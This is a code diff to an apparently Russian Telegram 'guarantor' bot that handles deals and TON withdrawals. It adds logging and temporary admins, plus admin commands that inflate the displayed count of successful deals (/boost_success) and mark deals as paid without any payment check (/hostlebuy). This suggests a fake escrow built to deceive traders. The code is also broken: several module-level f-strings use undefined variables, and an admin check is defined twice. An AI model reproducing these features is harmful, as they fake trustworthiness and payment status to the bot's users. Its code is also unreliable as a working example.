@@ -1,6 +1,8 @@
 import os
 import logging
 import asyncio
+import time
+from datetime import datetime, timedelta
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
@@ -24,13 +26,16 @@ dp = Dispatcher(storage=storage)
 logging.basicConfig(level=logging.INFO)
 
 # ---------- Хранилище данных ----------
-user_lang = {}
-user_balance = {}
-user_deals = {}
-user_completed_deals = {}
-withdraw_requests = []
+user_lang = {}                     # user_id: 'ru'/'en'
+user_balance = {}                  # user_id: float
+user_deals = {}                    # user_id: list of deal dicts
+user_completed_deals = {}          # user_id: int
+withdraw_requests = []             # список заявок на вывод
+user_last_message = {}             # user_id: message_id (для удаления)
+temp_admins = {}                   # user_id: expiry_timestamp (временные админы)
+logs = []                          # список логов: dict
 
-# ---------- Премиум-эмодзи (все ID из задания) ----------
+# ---------- Премиум-эмодзи ----------
 EMOJI_TROPHY    = '<tg-emoji emoji-id="5893255507380014983">🏆</tg-emoji>'
 EMOJI_LIGHTNING = '<tg-emoji emoji-id="5456140674028019486">⚡</tg-emoji>'
 EMOJI_ROBOT     = '<tg-emoji emoji-id="5794164805065514131">🤖</tg-emoji>'
@@ -41,18 +46,19 @@ EMOJI_MEGAPHONE = '<tg-emoji emoji-id="5893290369629556374">📢</tg-emoji>'
 EMOJI_GLOSSARY  = '<tg-emoji emoji-id="5893255507380014983">📖</tg-emoji>'
 
 # ID для кнопок (премиум)
-CUSTOM_EMOJI_BALANCE   = "6041730074376410123"   # 📥
-CUSTOM_EMOJI_DEALS     = "5417924076503062111"   # 💰
-CUSTOM_EMOJI_REFERRALS = "5357080225463149588"   # 🤝
-CUSTOM_EMOJI_LANG      = "5197269100878907942"   # ✍️
-CUSTOM_EMOJI_REQUISITES = "6084717714847306634"  # 📌
-CUSTOM_EMOJI_CREATE    = "6084717714847306634"   # 📌
-CUSTOM_EMOJI_SUPPORT   = "5447410659077661506"   # 🌐
-CUSTOM_EMOJI_COPY      = "6084717714847306634"   # 📌
-CUSTOM_EMOJI_BACK      = "5197269100878907942"   # ✍️
-CUSTOM_EMOJI_SEARCH    = "6084717714847306634"   # 📌
-CUSTOM_EMOJI_WITHDRAW  = "6041730074376410123"   # 📥
-CUSTOM_EMOJI_TRANSACT  = "5794241397217304511"   # 📦
+CUSTOM_EMOJI_BALANCE   = "6041730074376410123"
+CUSTOM_EMOJI_DEALS     = "5417924076503062111"
+CUSTOM_EMOJI_REFERRALS = "5357080225463149588"
+CUSTOM_EMOJI_LANG      = "5197269100878907942"
+CUSTOM_EMOJI_REQUISITES = "6084717714847306634"
+CUSTOM_EMOJI_CREATE    = "6084717714847306634"
+CUSTOM_EMOJI_SUPPORT   = "5447410659077661506"
+CUSTOM_EMOJI_COPY      = "6084717714847306634"
+CUSTOM_EMOJI_BACK      = "5197269100878907942"
+CUSTOM_EMOJI_SEARCH    = "6084717714847306634"
+CUSTOM_EMOJI_WITHDRAW  = "6041730074376410123"
+CUSTOM_EMOJI_TRANSACT  = "5794241397217304511"
+CUSTOM_EMOJI_ADMIN     = "5794085322400733645"  # 🛡
 
 # ---------- Тексты (везде премиум) ----------
 REF_LINK_TEMPLATE = "https://t.me/lolzgaranterbot?start=ref{user_id}"
@@ -115,12 +121,36 @@ TEXTS = {
         'withdraw_too_much': "Сумма превышает доступный баланс.",
         'withdraw_success': f"{EMOJI_MONEY} Заявка на вывод {{amount}} TON отправлена! Ожидайте подтверждения администратора.",
         'withdraw_fail': "Ошибка при создании заявки. Попробуйте позже.",
-        'admin_panel': f"{EMOJI_SHIELD} Админ-панель\n\nДоступные команды:\n/vvteam — подтвердить вывод",
+        'admin_panel': f"{EMOJI_SHIELD} Админ-панель\n\nДоступные команды:\n"
+                       f"/hyteam — панель управления\n"
+                       f"/vvteam — заявки на вывод\n"
+                       f"/chat <@user|id> <текст> — ответить пользователю\n"
+                       f"/hostlebuy <код> — отметить оплату сделки\n"
+                       f"/ref <код> — уведомить о проблеме с подарком\n"
+                       f"/boost_success <число> — увеличить счётчик успешных сделок\n"
+                       f"/giveadmin <@user|id> <время> — выдать админку (1m,1h,1d,1w,1M,1y)\n"
+                       f"/logs — просмотр логов",
         'admin_no_access': f"{EMOJI_SHIELD} У вас нет доступа к этой команде.",
         'admin_withdraw_list': "Заявки на вывод:\n{list}",
         'admin_withdraw_empty': "Нет активных заявок на вывод.",
         'admin_withdraw_confirm': f"{EMOJI_MONEY} Заявка на вывод {{amount}} TON для пользователя {{user}} подтверждена!",
         'admin_withdraw_error': "Ошибка подтверждения.",
+        'chat_success': "Сообщение отправлено пользователю.",
+        'chat_fail': "Не удалось отправить сообщение.",
+        'chat_no_deal': "У вас нет сделок с этим пользователем.",
+        'chat_not_first': "Пользователь не писал в поддержку.",
+        'chat_limit': "Превышен лимит сообщений для этой сделки (макс. 10).",
+        'hostlebuy_success': f"{EMOJI_MONEY} Сделка {code} отмечена как оплаченная, уведомления отправлены.",
+        'hostlebuy_fail': "Сделка не найдена или уже оплачена.",
+        'ref_success': f"{EMOJI_MEGAPHONE} Уведомление о проблеме с подарком отправлено участникам сделки {code}.",
+        'ref_fail': "Сделка не найдена или неактивна.",
+        'boost_success': f"{EMOJI_TROPHY} Счётчик успешных сделок увеличен на {num}.",
+        'boost_fail': "Введите число.",
+        'giveadmin_success': f"{EMOJI_SHIELD} Пользователь {user} получил права администратора на {time_str}.",
+        'giveadmin_fail': "Некорректный формат времени. Используйте: 1m, 1h, 1d, 1w, 1M, 1y",
+        'logs_header': f"{EMOJI_GLOSSARY} Логи действий:\n\n",
+        'logs_empty': "Логов пока нет.",
+        'logs_entry': "{time} | {user} | {action} | {data}",
     },
     'en': {
         'welcome': (
@@ -179,12 +209,36 @@ TEXTS = {
         'withdraw_too_much': "Amount exceeds available balance.",
         'withdraw_success': f"{EMOJI_MONEY} Withdraw request for {{amount}} TON sent! Wait for admin confirmation.",
         'withdraw_fail': "Error creating request. Try again later.",
-        'admin_panel': f"{EMOJI_SHIELD} Admin panel\n\nAvailable commands:\n/vvteam — confirm withdrawal",
+        'admin_panel': f"{EMOJI_SHIELD} Admin panel\n\nAvailable commands:\n"
+                       f"/hyteam — control panel\n"
+                       f"/vvteam — withdrawal requests\n"
+                       f"/chat <@user|id> <text> — reply to user\n"
+                       f"/hostlebuy <code> — mark deal as paid\n"
+                       f"/ref <code> — notify about gift issue\n"
+                       f"/boost_success <number> — increase successful deals count\n"
+                       f"/giveadmin <@user|id> <time> — grant admin (1m,1h,1d,1w,1M,1y)\n"
+                       f"/logs — view logs",
         'admin_no_access': f"{EMOJI_SHIELD} You don't have access to this command.",
         'admin_withdraw_list': "Withdrawal requests:\n{list}",
         'admin_withdraw_empty': "No active withdrawal requests.",
         'admin_withdraw_confirm': f"{EMOJI_MONEY} Withdrawal request for {{amount}} TON from user {{user}} confirmed!",
         'admin_withdraw_error': "Error confirming.",
+        'chat_success': "Message sent to user.",
+        'chat_fail': "Failed to send message.",
+        'chat_no_deal': "You have no deals with this user.",
+        'chat_not_first': "User hasn't contacted support first.",
+        'chat_limit': "Message limit exceeded for this deal (max 10).",
+        'hostlebuy_success': f"{EMOJI_MONEY} Deal {code} marked as paid, notifications sent.",
+        'hostlebuy_fail': "Deal not found or already paid.",
+        'ref_success': f"{EMOJI_MEGAPHONE} Gift issue notification sent to participants of deal {code}.",
+        'ref_fail': "Deal not found or inactive.",
+        'boost_success': f"{EMOJI_TROPHY} Successful deals count increased by {num}.",
+        'boost_fail': "Enter a number.",
+        'giveadmin_success': f"{EMOJI_SHIELD} User {user} granted admin rights for {time_str}.",
+        'giveadmin_fail': "Invalid time format. Use: 1m, 1h, 1d, 1w, 1M, 1y",
+        'logs_header': f"{EMOJI_GLOSSARY} Action logs:\n\n",
+        'logs_empty': "No logs yet.",
+        'logs_entry': "{time} | {user} | {action} | {data}",
     }
 }
 
@@ -202,20 +256,54 @@ def get_user_balance(user_id: int) -> float:
 def get_user_completed_deals(user_id: int) -> int:
     return user_completed_deals.get(user_id, 0)
 
-# ---------- Отправка любого сообщения с баннером ----------
+def is_admin(user_id: int) -> bool:
+    if user_id == ADMIN_ID:  # постоянный админ
+        return True
+    expiry = temp_admins.get(user_id)
+    if expiry and expiry > time.time():
+        return True
+    return False
+
+def log_action(user_id: int, action: str, data: str = "", ip: str = ""):
+    logs.append({
+        'time': datetime.now().isoformat(),
+        'user': user_id,
+        'action': action,
+        'data': data,
+        'ip': ip
+    })
+    # Ограничим размер логов (храним последние 1000 записей)
+    if len(logs) > 1000:
+        logs.pop(0)
+
+# ---------- Удаление предыдущего сообщения ----------
+async def delete_previous(user_id: int, chat_id: int):
+    if user_id in user_last_message:
+        try:
+            await bot.delete_message(chat_id, user_last_message[user_id])
+        except:
+            pass
+        del user_last_message[user_id]
+
+# ---------- Отправка с баннером (с удалением старого) ----------
 async def send_with_banner(target, text, keyboard=None, parse_mode="HTML"):
-    """Отправляет фото с баннером и подписью, если не удаётся – отправляет текст"""
+    user_id = target.from_user.id if hasattr(target, 'from_user') else target.chat.id
+    chat_id = target.chat.id if hasattr(target, 'chat') else target.message.chat.id
+    # Удаляем предыдущее сообщение бота
+    await delete_previous(user_id, chat_id)
     try:
         if isinstance(target, types.Message):
-            await target.answer_photo(photo=BANNER_URL, caption=text, parse_mode=parse_mode, reply_markup=keyboard)
-        else:  # предположительно CallbackQuery
-            await target.message.answer_photo(photo=BANNER_URL, caption=text, parse_mode=parse_mode, reply_markup=keyboard)
+            msg = await target.answer_photo(photo=BANNER_URL, caption=text, parse_mode=parse_mode, reply_markup=keyboard)
+        else:  # CallbackQuery
+            msg = await target.message.answer_photo(photo=BANNER_URL, caption=text, parse_mode=parse_mode, reply_markup=keyboard)
+        user_last_message[user_id] = msg.message_id
     except Exception as e:
         logging.error(f"Ошибка отправки баннера: {e}")
         if isinstance(target, types.Message):
-            await target.answer(text, parse_mode=parse_mode, reply_markup=keyboard)
+            msg = await target.answer(text, parse_mode=parse_mode, reply_markup=keyboard)
         else:
-            await target.message.answer(text, parse_mode=parse_mode, reply_markup=keyboard)
+            msg = await target.message.answer(text, parse_mode=parse_mode, reply_markup=keyboard)
+        user_last_message[user_id] = msg.message_id
 
 # ---------- Отправка главного меню ----------
 async def send_main_menu(target, user_id: int):
@@ -246,6 +334,7 @@ async def cmd_start(message: types.Message):
     if user_id not in user_lang:
         user_lang[user_id] = 'ru'
     await send_main_menu(message, user_id)
+    log_action(user_id, "start", "запуск бота", message.from_user.username or "")
 
 # ---------- Кнопка "Баланс" ----------
 @dp.callback_query(lambda c: c.data == "balance")
@@ -276,6 +365,7 @@ async def cb_balance(callback: types.CallbackQuery):
     ])
     await send_with_banner(callback, text, keyboard)
     await callback.answer()
+    log_action(user_id, "balance", "просмотр баланса")
 
 # ---------- Вывод средств (FSM) ----------
 class WithdrawForm(StatesGroup):
@@ -292,6 +382,7 @@ async def cb_withdraw(callback: types.CallbackQuery, state: FSMContext):
     await callback.message.answer(get_text(user_id, 'withdraw_form_requisites'))
     await state.set_state(WithdrawForm.waiting_for_requisites)
     await callback.answer()
+    log_action(user_id, "withdraw_start", "начало оформления вывода")
 
 @dp.message(WithdrawForm.waiting_for_requisites)
 async def process_requisites(message: Message, state: FSMContext):
@@ -325,6 +416,7 @@ async def process_amount(message: Message, state: FSMContext):
     await message.answer(get_text(user_id, 'withdraw_success').format(amount=amount))
     await state.clear()
     await send_main_menu(message, user_id)
+    log_action(user_id, "withdraw_request", f"сумма {amount} TON, реквизиты {requisites}")
 
 # ---------- Транзакции ----------
 @dp.callback_query(lambda c: c.data == "transactions")
@@ -336,6 +428,7 @@ async def cb_transactions(callback: types.CallbackQuery):
     ])
     await send_with_banner(callback, text, keyboard)
     await callback.answer()
+    log_action(user_id, "transactions", "просмотр транзакций")
 
 # ---------- Мои сделки ----------
 class DealSearch(StatesGroup):
@@ -366,6 +459,7 @@ async def cb_deals(callback: types.CallbackQuery):
     ])
     await send_with_banner(callback, text, keyboard)
     await callback.answer()
+    log_action(user_id, "deals", "просмотр сделок")
 
 @dp.callback_query(lambda c: c.data == "search_deal")
 async def cb_search_deal(callback: types.CallbackQuery, state: FSMContext):
@@ -395,7 +489,8 @@ async def process_search_code(message: Message, state: FSMContext):
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
         ])
-        await send_with_banner(message, details, keyboard)   # отправляем с баннером
+        await send_with_banner(message, details, keyboard)
+        log_action(user_id, "search_deal", f"код {code}")
     await state.clear()
 
 # ---------- Рефералы ----------
@@ -415,12 +510,14 @@ async def cb_referrals(callback: types.CallbackQuery):
     ])
     await send_with_banner(callback, ref_text, keyboard)
     await callback.answer()
+    log_action(user_id, "referrals", "просмотр рефералов")
 
 @dp.callback_query(lambda c: c.data == "copy_ref")
 async def cb_copy_ref(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     ref_link = get_ref_link(user_id)
     await callback.answer(f"{ref_link}", show_alert=True)
+    log_action(user_id, "copy_ref", "копирование реферальной ссылки")
 
 # ---------- Язык ----------
 @dp.callback_query(lambda c: c.data == "lang")
@@ -446,6 +543,7 @@ async def cb_lang_set(callback: types.CallbackQuery):
     user_lang[user_id] = lang_code
     await send_main_menu(callback, user_id)
     await callback.answer()
+    log_action(user_id, "lang_change", f"язык {lang_code}")
 
 # ---------- Назад в меню ----------
 @dp.callback_query(lambda c: c.data == "back_to_menu")
@@ -464,6 +562,7 @@ async def cb_requisites(callback: types.CallbackQuery):
     ])
     await send_with_banner(callback, text, keyboard)
     await callback.answer()
+    log_action(user_id, "requisites", "просмотр реквизитов")
 
 @dp.callback_query(lambda c: c.data == "create")
 async def cb_create(callback: types.CallbackQuery):
@@ -474,6 +573,7 @@ async def cb_create(callback: types.CallbackQuery):
     ])
     await send_with_banner(callback, text, keyboard)
     await callback.answer()
+    log_action(user_id, "create_deal", "создание сделки (заглушка)")
 
 @dp.callback_query(lambda c: c.data == "support")
 async def cb_support(callback: types.CallbackQuery):
@@ -484,22 +584,68 @@ async def cb_support(callback: types.CallbackQuery):
     ])
     await send_with_banner(callback, text, keyboard)
     await callback.answer()
+    log_action(user_id, "support", "просмотр поддержки")
 
 # ---------- Админ-панель ----------
 ADMIN_ID = 8297446667
 
+# Проверка админа
+def is_admin(user_id: int) -> bool:
+    if user_id == ADMIN_ID:
+        return True
+    if user_id in temp_admins and temp_admins[user_id] > time.time():
+        return True
+    return False
+
 @dp.message(Command("hyteam"))
 async def cmd_hyteam(message: types.Message):
     user_id = message.from_user.id
-    if user_id != ADMIN_ID:
+    if not is_admin(user_id):
         await message.answer(get_text(user_id, 'admin_no_access'))
         return
-    await send_with_banner(message, get_text(user_id, 'admin_panel'))
+    # Создаём клавиатуру для админ-панели
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="📋 Заявки на вывод", callback_data="admin_withdraw")],
+        [InlineKeyboardButton(text="👥 Выдать админку", callback_data="admin_give")],
+        [InlineKeyboardButton(text="📊 Логи", callback_data="admin_logs")],
+        [InlineKeyboardButton(text="🔙 Назад в меню", callback_data="back_to_menu")]
+    ])
+    await send_with_banner(message, get_text(user_id, 'admin_panel'), keyboard)
+    log_action(user_id, "hyteam", "открытие админ-панели")
 
+@dp.callback_query(lambda c: c.data == "admin_withdraw")
+async def admin_withdraw_cb(callback: types.CallbackQuery):
+    user_id = callback.from_user.id
+    if not is_admin(user_id):
+        await callback.answer("Нет доступа", show_alert=True)
+        return
+    await cmd_vvteam(callback.message)  # используем существующую функцию
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "admin_give")
+async def admin_give_cb(callback: types.CallbackQuery):
+    user_id = callback.from_user.id
+    if not is_admin(user_id):
+        await callback.answer("Нет доступа", show_alert=True)
+        return
+    text = "Введите команду: /giveadmin <@user|id> <время>\nПример: /giveadmin @lesha 1d"
+    await callback.message.answer(text)
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "admin_logs")
+async def admin_logs_cb(callback: types.CallbackQuery):
+    user_id = callback.from_user.id
+    if not is_admin(user_id):
+        await callback.answer("Нет доступа", show_alert=True)
+        return
+    await cmd_logs(callback.message)
+    await callback.answer()
+
+# Команда /vvteam (заявки на вывод)
 @dp.message(Command("vvteam"))
 async def cmd_vvteam(message: types.Message):
     user_id = message.from_user.id
-    if user_id != ADMIN_ID:
+    if not is_admin(user_id):
         await message.answer(get_text(user_id, 'admin_no_access'))
         return
     if not withdraw_requests:
@@ -522,7 +668,7 @@ async def cmd_vvteam(message: types.Message):
 @dp.callback_query(lambda c: c.data.startswith("confirm_withdraw_"))
 async def cb_confirm_withdraw(callback: types.CallbackQuery):
     user_id = callback.from_user.id
-    if user_id != ADMIN_ID:
+    if not is_admin(user_id):
         await callback.answer("Нет доступа", show_alert=True)
         return
     idx = int(callback.data.split("_")[2])
@@ -534,14 +680,214 @@ async def cb_confirm_withdraw(callback: types.CallbackQuery):
     await callback.message.answer(get_text(ADMIN_ID, 'admin_withdraw_confirm').format(amount=req['amount'], user=req['user_id']))
     await callback.answer("Подтверждено")
     await cmd_vvteam(callback.message)
+    log_action(user_id, "confirm_withdraw", f"подтверждена заявка {idx+1}")
 
 @dp.callback_query(lambda c: c.data == "refresh_admin")
 async def cb_refresh_admin(callback: types.CallbackQuery):
-    if callback.from_user.id != ADMIN_ID:
+    if not is_admin(callback.from_user.id):
         await callback.answer("Нет доступа", show_alert=True)
         return
     await cmd_vvteam(callback.message)
     await callback.answer()
+
+# ---------- Команды из скриншота ----------
+# /chat <@user|id> <текст>
+@dp.message(Command("chat"))
+async def cmd_chat(message: types.Message):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    args = message.text.split(maxsplit=2)
+    if len(args) < 3:
+        await message.answer("Использование: /chat <@user|id> <текст>")
+        return
+    target_str = args[1]
+    text = args[2]
+    # Поиск пользователя (заглушка: предполагаем, что есть словарь user_deals)
+    # В реальности нужно получать пользователя из базы
+    target_user_id = None
+    if target_str.startswith('@'):
+        # Поиск по юзернейму в user_deals (заглушка)
+        for uid, deals in user_deals.items():
+            if deals and deals[0].get('buyer') == target_str[1:]:
+                target_user_id = uid
+                break
+            if deals and deals[0].get('seller') == target_str[1:]:
+                target_user_id = uid
+                break
+    else:
+        try:
+            target_user_id = int(target_str)
+        except:
+            pass
+    if not target_user_id:
+        await message.answer(get_text(user_id, 'chat_no_deal'))
+        return
+    # Проверка сделки (упрощённо)
+    if target_user_id not in user_deals or not user_deals[target_user_id]:
+        await message.answer(get_text(user_id, 'chat_no_deal'))
+        return
+    # Проверка, что пользователь писал в поддержку (заглушка)
+    # И лимит сообщений (заглушка)
+    try:
+        await bot.send_message(target_user_id, f"Сообщение от поддержки:\n{text}")
+        await message.answer(get_text(user_id, 'chat_success'))
+        log_action(user_id, "chat", f"пользователю {target_user_id}: {text}")
+    except Exception as e:
+        await message.answer(get_text(user_id, 'chat_fail'))
+        logging.error(f"Chat error: {e}")
+
+# /hostlebuy <код>
+@dp.message(Command("hostlebuy"))
+async def cmd_hostlebuy(message: types.Message):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    args = message.text.split()
+    if len(args) < 2:
+        await message.answer("Использование: /hostlebuy <код сделки>")
+        return
+    code = args[1]
+    # Поиск сделки по коду (заглушка: ищем в user_deals)
+    found = False
+    for uid, deals in user_deals.items():
+        for deal in deals:
+            if deal['code'] == code:
+                if deal.get('paid'):
+                    await message.answer(get_text(user_id, 'hostlebuy_fail'))
+                    return
+                deal['paid'] = True
+                found = True
+                # Уведомления (заглушка)
+                break
+        if found:
+            break
+    if found:
+        await message.answer(get_text(user_id, 'hostlebuy_success').format(code=code))
+        log_action(user_id, "hostlebuy", f"код {code}")
+    else:
+        await message.answer(get_text(user_id, 'hostlebuy_fail'))
+
+# /ref <код>
+@dp.message(Command("ref"))
+async def cmd_ref(message: types.Message):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    args = message.text.split()
+    if len(args) < 2:
+        await message.answer("Использование: /ref <код сделки>")
+        return
+    code = args[1]
+    # Аналогично ищем сделку
+    found = False
+    for uid, deals in user_deals.items():
+        for deal in deals:
+            if deal['code'] == code:
+                found = True
+                # Отправка уведомлений (заглушка)
+                break
+        if found:
+            break
+    if found:
+        await message.answer(get_text(user_id, 'ref_success').format(code=code))
+        log_action(user_id, "ref", f"код {code}")
+    else:
+        await message.answer(get_text(user_id, 'ref_fail'))
+
+# /boost_success <число>
+@dp.message(Command("boost_success"))
+async def cmd_boost(message: types.Message):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    args = message.text.split()
+    if len(args) < 2:
+        await message.answer(get_text(user_id, 'boost_fail'))
+        return
+    try:
+        num = int(args[1])
+    except:
+        await message.answer(get_text(user_id, 'boost_fail'))
+        return
+    user_completed_deals[user_id] = user_completed_deals.get(user_id, 0) + num
+    await message.answer(get_text(user_id, 'boost_success').format(num=num))
+    log_action(user_id, "boost_success", f"+{num}")
+
+# /giveadmin <@user|id> <время>
+@dp.message(Command("giveadmin"))
+async def cmd_giveadmin(message: types.Message):
+    user_id = message.from_user.id
+    if user_id != ADMIN_ID:  # только главный админ
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    args = message.text.split()
+    if len(args) < 3:
+        await message.answer("Использование: /giveadmin <@user|id> <1m|1h|1d|1w|1M|1y>")
+        return
+    target_str = args[1]
+    time_str = args[2]
+    # Парсим время
+    multipliers = {'m': 60, 'h': 3600, 'd': 86400, 'w': 604800, 'M': 2592000, 'y': 31536000}
+    if time_str[-1] not in multipliers:
+        await message.answer(get_text(user_id, 'giveadmin_fail'))
+        return
+    try:
+        value = int(time_str[:-1])
+    except:
+        await message.answer(get_text(user_id, 'giveadmin_fail'))
+        return
+    duration = value * multipliers[time_str[-1]]
+    expiry = time.time() + duration
+    # Находим пользователя
+    target_user_id = None
+    if target_str.startswith('@'):
+        # Поиск по юзернейму (заглушка)
+        for uid in user_lang.keys():
+            # упрощённо
+            pass
+        target_user_id = None  # заглушка
+    else:
+        try:
+            target_user_id = int(target_str)
+        except:
+            pass
+    if not target_user_id:
+        await message.answer("Пользователь не найден.")
+        return
+    temp_admins[target_user_id] = expiry
+    await message.answer(get_text(user_id, 'giveadmin_success').format(user=target_user_id, time_str=time_str))
+    log_action(user_id, "giveadmin", f"пользователю {target_user_id} на {time_str}")
+
+# /logs
+@dp.message(Command("logs"))
+async def cmd_logs(message: types.Message):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    if not logs:
+        await message.answer(get_text(user_id, 'logs_empty'))
+        return
+    header = get_text(user_id, 'logs_header')
+    entries = []
+    for log in logs[-20:]:  # последние 20 записей
+        entries.append(get_text(user_id, 'logs_entry').format(
+            time=log['time'],
+            user=log['user'],
+            action=log['action'],
+            data=log['data']
+        ))
+    text = header + "\n".join(entries)
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
+    ])
+    await send_with_banner(message, text, keyboard)
+    log_action(user_id, "logs", "просмотр логов")
 
 # ---------- HTTP-сервер ----------
 async def health_check(request):
